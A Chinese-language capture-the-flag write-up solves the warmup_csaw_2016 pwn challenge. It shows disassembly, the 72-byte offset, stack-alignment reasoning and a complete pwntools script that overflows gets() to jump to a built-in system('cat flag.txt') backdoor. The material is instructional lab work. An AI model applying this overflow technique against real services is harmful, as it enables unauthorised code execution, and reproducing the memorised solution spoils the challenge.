# Speedrun：warmup_csaw_2016

> 题型：ret2text / stripped / 64 位 `gets` 栈溢出  
> 目标：跳到 `0x40060e`，执行 `system("cat flag.txt")`  
> 关键：偏移 **72**；程序自己泄露后门地址 `WOW:0x40060d`

> ⚠️ **复现提示（2026-11-23 审计）**：EXP 只写了远程分支，`HOST` 是 2019 年 CTF²
> 的临时靶机（已下线）。本地复现按 §「本地实测」用 `process('./warmup_csaw_2016')`，
> 并在当前目录放 `flag.txt`（后门执行 `system("cat flag.txt")`）；二进制已归档在同目录。

---

## 0. 一句话结论

```text
程序先打印 WOW:0x40060d
  → 0x40060d 就是后门：system("cat flag.txt")
  → gets(buf) 的 buf 在 rbp-0x40
  → 偏移 = 0x40 + 8 = 72
  → 跳 0x40060d 会因 push rbp 破坏栈对齐
  → 实际跳 0x40060e（跳过 push rbp）
```

Payload：

```python
b'A' * 72 + p64(0x40060e)
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2text'

file warmup_csaw_2016
checksec --file=warmup_csaw_2016
strings -tx warmup_csaw_2016 | grep -E 'flag|WOW|Warm'
objdump -d -M intel warmup_csaw_2016 | sed -n '/400692:/,/4006a5/p'
objdump -d -M intel warmup_csaw_2016 | sed -n '/40060d:/,/40061d/p'
objdump -s -j .rodata warmup_csaw_2016
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
No canary found
No PIE (0x400000)
NX unknown - GNU_STACK missing
Stack: Executable

40060d: push   rbp
40060e: mov    rbp,rsp
400611: mov    edi,0x400734          ; "cat flag.txt"
400616: call   4004d0 <system@plt>
40061b: pop    rbp
40061c: ret

400692: lea    rax,[rbp-0x40]
400696: mov    rdi,rax
40069e: call   400500 <gets@plt>
4006a3: leave
4006a4: ret

Contents of section .rodata:
 400730 01000200 63617420 666c6167 2e747874  ....cat flag.txt
 400740 002d5761 726d2055 702d0a00 574f573a  .-Warm Up-..WOW:
 400750 0025700a 003e00                      .%p..>.
```

读法：

| 观察 | 结论 |
| --- | --- |
| Stripped | `nm` 没符号，但程序运行时打印 `WOW:0x40060d` |
| `0x40060d` 调用 `system` | 后门地址直接白给 |
| `0x400734` 是 `"cat flag.txt"` | 后门直接打印 flag，不是 shell |
| `gets` 的 buf 在 `rbp-0x40` | offset = 64 + 8 = 72 |
| No PIE | 地址可硬编码 |

> 注意：这题不是 `system("/bin/sh")`。  
> 它的后门是 `system("cat flag.txt")`，所以打完后直接收 flag，不需要再发 `cat`。

---

## 2. 关键逆向

### 2.1 主逻辑：打印后门地址 + `gets`

程序被 stripped，但反汇编仍能看到关键片段：

```asm
; 打印 "-Warm Up-\n"
400625: mov    edx,0xa
40062a: mov    esi,0x400741
40062f: mov    edi,0x1
400634: call   4004c0 <write@plt>

; 打印 "WOW:"
400639: mov    edx,0x4
40063e: mov    esi,0x40074c
400643: mov    edi,0x1
400648: call   4004c0 <write@plt>

; sprintf(buf, "%p\n", 0x40060d)
40064d: lea    rax,[rbp-0x80]
400651: mov    edx,0x40060d
400656: mov    esi,0x400751        ; "%p\n"
40065b: mov    rdi,rax
40065e: call   400510 <sprintf@plt>

; write(1, buf, 9)
400668: lea    rax,[rbp-0x80]
40066c: mov    edx,0x9
400671: mov    rsi,rax
400674: mov    edi,0x1
400679: call   4004c0 <write@plt>

; 打印 ">"
40067e: mov    edx,0x1
400683: mov    esi,0x400755
400688: mov    edi,0x1
40068d: call   4004c0 <write@plt>

; gets(buf)，buf = rbp - 0x40
400692: lea    rax,[rbp-0x40]
400696: mov    rdi,rax
400699: mov    eax,0x0
40069e: call   400500 <gets@plt>
4006a3: leave
4006a4: ret
```

所以运行时输出：

```text
-Warm Up-
WOW:0x40060d
>
```

这个 `0x40060d` 就是后门地址。

### 2.2 后门：`system("cat flag.txt")`

```asm
40060d: push   rbp
40060e: mov    rbp,rsp
400611: mov    edi,0x400734        ; "cat flag.txt"
400616: call   4004d0 <system@plt>
40061b: pop    rbp
40061c: ret
```

等价 C：

```c
void backdoor(void) {
    system("cat flag.txt");
}
```

---

## 3. 偏移与栈对齐

### 3.1 偏移 72

```asm
400692: lea    rax,[rbp-0x40]
40069e: call   gets@plt
```

栈布局：

```text
rbp-0x40 .. rbp-0x01 : buf[64]
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

```text
offset = 0x40 + 8 = 72
```

### 3.2 目标 0x40060e

如果跳到 `0x40060d`：

```asm
push rbp
```

会破坏 `system()` 的 16 字节栈对齐，典型崩溃是 `movaps` 段错误。

跳到 `0x40060e`：

```asm
mov rbp,rsp
mov edi,0x400734
call system@plt
```

跳过 `push rbp`，对齐正确。

本地实测（cwd 里有 `flag.txt`）：

| target | 结果 |
| --- | --- |
| `0x40060d` | SIGSEGV，无 flag |
| `0x40060e` | 输出 `flag{local_test_03}`，随后进程可能崩溃 |

> 后门 `ret` 会返回到栈上的垃圾地址，所以 flag 打印完后 SIGILL/SIGSEGV 是正常的。  
> 只要 `recvall` 收到了 flag，就不用管退出码。

---

## 4. Payload 布局

```text
[ 72 字节 'A' ][ p64(0x40060e) ]
```

```python
from pwn import *

payload = b'A' * 72 + p64(0x40060e)
```

总长度：

```text
72 + 8 = 80 字节
```

---

## 5. 完整 exp

```python
from pwn import *
import ssl, re

context.arch = "amd64"
context.log_level = "info"

HOST = "c38877f17f6daa72764172a2.tcp-ctf2.dasctf.com"
PORT = 9999

def exploit():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    p = remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    payload = b"A" * 72 + p64(0x40060e)
    p.sendline(payload)

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:CTF2|flag|DASCTF)\{[^}]+\}", out)
    if flags:
        print(f"[🎉] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] Flag not found, raw output above")

if __name__ == "__main__":
    exploit()
```

本地复现：

```bash
mkdir -p /tmp/warmup_test
cp warmup_csaw_2016 /tmp/warmup_test/
printf 'flag{local_test_03}\n' > /tmp/warmup_test/flag.txt
cd /tmp/warmup_test
python -c "from pwn import *; p=process('./warmup_csaw_2016'); p.sendline(b'A'*72+p64(0x40060e)); print(p.recvall(timeout=3))"
```

---

## 6. 交互坑

1. **这不是 shell**
   后门是 `system("cat flag.txt")`，打完后直接输出 flag。  
   不要再发 `cat flag`，也不要用 `p.interactive()` 等 `$`。

2. **flag 文件名是 `flag.txt`**
   相对路径，进程的 CWD 下必须有 `flag.txt`。  
   本地测试时如果当前目录没有，`cat` 会报错。

3. **偏移 72，不是 64**
   `0x40` 是 buffer 大小，还要加 8 字节 saved rbp。

4. **目标 0x40060e，不是 0x40060d**
   `0x40060d` 的 `push rbp` 会导致 `system` 栈对齐崩溃。

5. **进程最后可能崩溃**
   后门 `ret` 返回到垃圾地址，SIGILL/SIGSEGV 正常；flag 已经打印即可。

6. **TLS**
   CTF² 需要 `ssl=True`；如果平台是明文 TCP，去掉 ssl 参数。

7. **stripped 不影响**
   程序自己输出 `WOW:0x40060d`，等于把后门地址送到你手上。

---

## 7. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：64 位、No PIE、stripped |
| 0:20–0:40 | `strings`：发现 `cat flag.txt`、`WOW:` |
| 0:40–1:00 | `objdump` 看 `0x40060d` 和 `gets`，拿到后门和 offset 72 |
| 1:00–1:20 | 写 payload：`72 + p64(0x40060e)` |
| 1:20–1:40 | 本地放 `flag.txt` 验证，再打远程 |
| 1:40–2:00 | `recvall` + 正则提取 flag |

---

## 8. 题型识别卡

```text
stripped + 程序打印 WOW:0x40060d
+ 0x40060d 处 system("cat flag.txt")
+ gets(buf) 且 buf 在 rbp-0x40
+ No PIE
= ret2text，offset 72，target 0x40060e
```

一句话：**程序把后门地址写在脸上；`72 + p64(0x40060e)`，收 flag。**

